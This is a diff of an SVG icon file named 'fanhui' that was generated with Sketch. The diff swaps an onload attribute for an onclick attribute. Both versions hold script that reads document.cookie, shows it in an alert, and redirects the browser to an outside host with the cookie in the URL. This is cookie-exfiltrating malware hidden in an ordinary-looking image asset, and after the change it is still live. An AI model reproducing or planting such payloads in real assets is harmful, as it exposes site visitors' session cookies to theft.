@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <svg width="8px" height="14px" viewBox="0 0 8 14" version="1.1" xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink"
-    onload="alert`${document.cookie}`;location.href='https://baidu.com?cookie='+document.cookie">
+    onclick="alert`${document.cookie}`;location.href='https://baidu.com?cookie='+document.cookie">
     <!-- Generator: Sketch 59.1 (86144) - https://sketch.com -->
     <title>fanhui</title>
     <desc>Created with Sketch.</desc>
